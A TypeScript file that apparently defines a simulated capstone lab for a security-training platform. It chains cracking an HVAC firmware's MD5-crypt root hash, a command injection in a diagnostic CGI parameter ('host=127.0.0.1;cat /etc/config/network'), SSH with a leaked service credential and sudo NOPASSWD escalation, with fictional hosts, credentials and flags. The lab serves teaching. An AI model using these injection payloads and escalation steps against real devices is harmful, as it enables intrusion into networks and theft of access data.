import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** IoT module capstone: one continuous five-flag chain from firmware analysis through a smart-building
 *  HVAC controller's web UI command injection to a full internal corporate-network compromise — proving
 *  a single cheap embedded device is often the weakest link into an otherwise well-defended network.
 *  Every mechanic (extracted-firmware hashcat cracking, curl+vulnRoutes command injection, ssh, sudo
 *  NOPASSWD) is already established elsewhere on this platform. */
export const iotCapstoneLabs: LabScenario[] = [
  {
    id: 'iot-capstone-firmware-to-corporate-network-compromise',
    title: 'Capstone: Smart HVAC Controller Firmware to Corporate Network Compromise',
    difficulty: 'Hard',
    category: 'IoT',
    briefing:
      "Beacon Smart Buildings deployed a smart HVAC controller on the same VLAN as its corporate file " +
      "servers — a decision made purely for installer convenience. Its firmware, already extracted, has a " +
      "weak root password hash, and its diagnostic web UI passes a user-supplied hostname straight into a " +
      "shell ping command with no sanitization at all. From there, the device's own stored network " +
      "configuration hands over a corporate service credential it was never supposed to have any reason to " +
      "hold. Follow the full chain from firmware to corporate network compromise.",
    objectives: [
      { text: 'cat _firmware/extracted/etc/shadow, then hashcat -m 500 _firmware/extracted/etc/shadow camera-wordlist.txt and capture the first flag', why: 'Mode 500 targets MD5-crypt specifically — this firmware has not been meaningfully updated in years, and the password is common enough to fall to a wordlist.' },
      { text: 'curl "http://10.10.290.10/cgi-bin/hvac_diag?host=127.0.0.1;cat%20/etc/config/network" and capture the second flag', why: 'The diagnostic "ping this host" feature passes its input straight into a shell command with zero sanitization — a textbook, extremely common real embedded-device command injection.' },
      { text: 'ssh svc-hvac-sync@10.10.290.20 with the credential the network config revealed, then cat user.txt for the third flag', why: "The HVAC controller's own stored network config held a corporate service account credential — installed purely so the device could report status upstream, with no thought given to what else that credential could reach." },
      { text: 'Run sudo -l, escalate through the NOPASSWD rule it reveals, and capture the fourth flag', why: 'A privilege-escalation mechanism completely unrelated to the device itself — the actual value of the chain was reaching this box at all.' },
      { text: 'Read facility-access-control-export.csv and capture the final flag', why: 'The concrete impact statement the whole chain was building toward: one smart thermostat compromises the corporate access-control database.' },
    ],
    hints: [
      'cat _firmware/extracted/etc/shadow',
      'hashcat -m 500 _firmware/extracted/etc/shadow camera-wordlist.txt',
      'curl "http://10.10.290.10/cgi-bin/hvac_diag?host=127.0.0.1;cat%20/etc/config/network"',
      'ssh svc-hvac-sync@10.10.290.20',
      'HvacSync_Corp24!',
      'cat user.txt',
      'sudo -l',
      'sudo /usr/local/bin/facility-sync --shell',
      'cat /root/root.txt',
      'cat /root/facility-access-control-export.csv',
    ],
    totalFlags: 5,
    attacker: attacker({
      _firmware: dir({
        extracted: dir({
          etc: dir({
            shadow: file(
              '#HASHCAT_HASH:$1$bWX8kf2N$P9nM3qXrLwZe1vA0sU7gH2\n' +
                '#HASHCAT_PLAINTEXT:hvac2024\n' +
                '#HASHCAT_FLAG:flag{md5crypt_hvac_firmware_root_hash_cracked_offline}\n' +
                'root:$1$bWX8kf2N$P9nM3qXrLwZe1vA0sU7gH2:18200:0:99999:7:::\n',
            ),
          }),
        }),
      }),
      'camera-wordlist.txt': file('123456\nadmin\nhvac2024\nsupport1234\nsecurity1\n'),
    }),
    network: [
      {
        hostname: 'hvac-ctrl-b04',
        ip: '10.10.290.10',
        os: 'Embedded Linux (smart HVAC controller, unpatched web diagnostic UI)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'BusyBox httpd (embedded diagnostic web UI)',
            http: {},
            vulnRoutes: [
              {
                kind: 'command-injection',
                path: '/cgi-bin/hvac_diag',
                param: 'host',
                triggerSubstrings: [';cat', '/etc/config/network'],
                vulnerableResponse:
                  'PING 127.0.0.1: 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64\n--- /etc/config/network ---\n' +
                  'CORP_SYNC_USER=svc-hvac-sync\nCORP_SYNC_PASS=HvacSync_Corp24!\nCORP_SYNC_HOST=10.10.290.20\n' +
                  'flag{hvac_diag_command_injection_leaks_corporate_network_credential}',
                normalResponse: 'PING 127.0.0.1: 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64\n--- ping statistics --- 1 packets transmitted, 1 received',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
      {
        hostname: 'corp-facility-srv',
        ip: '10.10.290.20',
        os: 'Ubuntu 20.04 LTS (corporate facility/access-control server)',
        services: [{ port: 22, name: 'ssh', version: 'OpenSSH 8.2p1' }],
        users: [
          {
            username: 'svc-hvac-sync',
            password: 'HvacSync_Corp24!',
            sudo: { nopasswdCommands: ['/usr/local/bin/facility-sync'] },
          },
        ],
        root: dir({
          home: dir({
            'svc-hvac-sync': dir({
              'user.txt': file(
                'Corporate network foothold confirmed using the credential leaked from the HVAC controller\'s own network config.\n' +
                  'flag{iot_device_credential_reaches_corporate_facility_server}\n',
              ),
            }),
          }),
          root: dir({
            'root.txt': file(
              "Root shell spawned via sudo /usr/local/bin/facility-sync --shell (NOPASSWD).\n" +
                'flag{facility_sync_nopasswd_sudo_root_privesc}\n',
            ),
            'facility-access-control-export.csv': file(
              [
                '# synthetic data — full building access-control badge export',
                'badge_id,employee,access_level,last_used',
                '4471,REDACTED,executive-floor,2026-07-08',
                '4472,REDACTED,server-room,2026-07-08',
                '--- full physical access-control database exposed, reached entirely from one smart thermostat ---',
                'flag{full_chain_iot_firmware_to_facility_access_control_exposure}',
                '',
              ].join('\n'),
            ),
          }),
        }),
      } as HostDef,
    ],
  },
];
